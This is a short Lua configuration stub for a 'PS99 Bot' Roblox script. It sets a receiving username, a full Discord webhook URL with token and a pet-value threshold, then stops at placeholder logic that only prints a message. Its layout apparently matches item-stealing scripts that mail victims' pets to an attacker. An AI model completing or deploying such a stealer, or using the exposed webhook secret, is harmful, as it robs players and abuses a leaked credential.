
-- PS99 Bot Script
Username = "mainarxd123"
Username2 = "your alr"
webhook = "https://discord.com/api/webhooks/1315408872793702520/pqWZQxlJS9muEbCfMkAWcOOEInL8EZkAHOgGlMxMEkgj8QkMQlqieEi22FLNgVYnCflq"
min_rap = 20

-- Rest of the Lua script logic
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- Example script logic here...
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local plr = game.Players.LocalPlayer
local MailMessage = "Generated via PS99 Bot"
local HttpService = game:GetService("HttpService")

print("PS99 script logic running...")
-- End of example logic
